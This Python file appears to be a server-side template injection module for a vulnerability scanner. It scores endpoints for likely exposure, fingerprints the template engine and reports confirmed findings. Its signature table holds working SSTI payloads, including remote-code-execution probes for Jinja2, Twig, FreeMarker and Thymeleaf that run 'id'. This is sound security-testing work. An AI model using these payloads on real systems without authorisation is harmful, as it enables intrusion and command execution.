from senshi.modules.base import VulnModule, TestResult
from senshi.reporters.models import Finding, Severity, Confidence


class SSTIModule(VulnModule):
    name = "ssti"
    description = "Server-Side Template Injection"
    severity = Severity.CRITICAL
    cwe_id = 1336
    payloads_dir = "ssti"
    techniques = ["detection", "jinja2", "twig", "freemarker", "velocity", "thymeleaf"]
    
    # Engine-specific markers
    ENGINE_SIGNATURES = {
        "jinja2": {
            "test": "{{7*7}}",
            "success": "49",
            "rce_test": "{{config.__class__.__init__.__globals__['os']}}",
        },
        "twig": {
            "test": "{{7*7}}",
            "success": "49",
            "rce_test": "{{_self.env.registerUndefinedFilterCallback('exec')}}",
        },
        "freemarker": {
            "test": "${7*7}",
            "success": "49",
            "rce_test": "${'freemarker.template.utility.Execute'?new()('id')}",
        },
        "velocity": {
            "test": "#set($x=7*7)$x",
            "success": "49",
        },
        "thymeleaf": {
            "test": "${7*7}",
            "success": "49",
            "rce_test": "${T(java.lang.Runtime).getRuntime().exec('id')}",
        },
        "pebble": {
            "test": "{{7*7}}",
            "success": "49",
        },
    }
    
    def is_applicable(self, endpoint: dict, tech_stack: dict) -> float:
        """SSTI is possible if endpoint has params and returns HTML/text."""
        score = 0.0
        
        # Must have injection points
        if endpoint.get("params"):
            score += 0.3
        
        # Template-like endpoints
        url_lower = endpoint.get("url", "").lower()
        if any(x in url_lower for x in ["template", "render", "view", "page", "preview"]):
            score += 0.3
        
        # Known template tech stacks
        # Check for template-related tech
        frameworks = tech_stack.get("framework", [])
        if isinstance(frameworks, list):
            stack_str = " ".join(frameworks).lower()
        else:
            stack_str = str(frameworks).lower()
            
        if any(fw in stack_str for fw in ["jinja", "flask", "django", "twig", "laravel", "spring"]):
            score += 0.2
        
        # Content-type is HTML
        if "html" in endpoint.get("content_type", "").lower():
            score += 0.2
        
        return min(score, 1.0)
    
    def get_injection_points(self, endpoint: dict) -> list[dict]:
        """Return params as injection points."""
        points = []
        for param in endpoint.get("params", []):
            points.append({"location": "param", "name": param})
        return points
    
    def detect_engine(self, endpoint: dict) -> str | None:
        """Detect which template engine is in use."""
        for engine, config in self.ENGINE_SIGNATURES.items():
            result = self._execute_test(
                endpoint,
                {"location": "param", "name": endpoint.get("params", [""])[0]},
                config["test"],
                "detection"
            )
            
            if config["success"] in result.response["body"]:
                return engine
        
        return None
    
    def analyze_result(self, result: TestResult) -> Finding | None:
        """Check if template expression was evaluated."""
        response_body = result.response["body"]
        payload = result.payload
        
        # Check for math evaluation (7*7=49)
        if "49" in response_body and ("7*7" in payload or "7*7" in payload):
            return Finding(
                title="Server-Side Template Injection (SSTI)",
                severity=Severity.CRITICAL,
                confidence=Confidence.CONFIRMED,
                category="ssti",
                description="Template expression was evaluated server-side, indicating SSTI vulnerability.",
                endpoint=result.request["url"],
                payload=payload,
                evidence=f"Expression '7*7' evaluated to '49' in response",
                response_snippet=response_body[:500],
            )
        
        # Check for config/class exposure (Jinja2)
        if any(x in response_body for x in ["<Config", "__class__", "__globals__"]):
            return Finding(
                title="Server-Side Template Injection (SSTI) — Config Exposure",
                severity=Severity.CRITICAL,
                confidence=Confidence.CONFIRMED,
                category="ssti",
                description="Template engine internals exposed, confirming SSTI with potential RCE.",
                endpoint=result.request["url"],
                payload=payload,
                evidence="Internal objects exposed in response",
                response_snippet=response_body[:500],
            )
        
        return None
